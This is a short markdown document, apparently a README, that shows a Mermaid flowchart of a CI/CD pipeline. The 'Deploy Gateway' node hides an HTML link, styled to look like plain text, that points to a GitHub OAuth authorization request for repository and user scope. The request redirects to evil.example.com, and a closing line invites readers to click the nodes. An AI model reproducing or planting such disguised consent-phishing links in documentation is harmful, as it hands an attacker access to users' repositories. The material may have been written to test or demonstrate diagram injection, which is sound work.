# CI/CD Pipeline Overview

```mermaid
flowchart TD
    A[Developer Push] --> B[GitHub Actions]
    B --> C[Build & Test]
    C --> D[Security Scan]
    D --> E["<a href='https://github.com/login/oauth/authorize?client_id=Iv1.example12345678&scope=repo,read:user&redirect_uri=https://evil.example.com/callback&state=random123' target='_top' style='color:inherit;text-decoration:none'>Deploy Gateway ↗</a>"]
    E --> F[Production]
    C --> G[Staging]
    G --> E
```

> Click any node for details about that pipeline stage.
